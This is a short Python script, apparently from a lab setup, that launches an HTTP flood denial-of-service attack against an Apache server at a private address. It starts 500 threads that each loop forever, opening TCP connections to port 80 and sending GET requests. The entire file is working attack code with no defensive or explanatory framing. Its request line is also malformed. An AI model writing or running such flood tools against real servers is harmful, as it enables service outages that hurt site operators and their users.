import threading
import socket

#the apache webserver
target = '10.0.2.6'

#attacking the HTTP port
port = 80


def http_flood():
    #endless loop
    while True:
        #Creating a socket with internet and defining the protocol and that is sock_stream
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(('Host: 10.0.2.15'  + "\r\n\r\n").encode('ascii'), (target,port))
        print("Request Sent")
        s.close()

for i in range(500):
    thread = threading.Thread(target=http_flood)
    thread.start()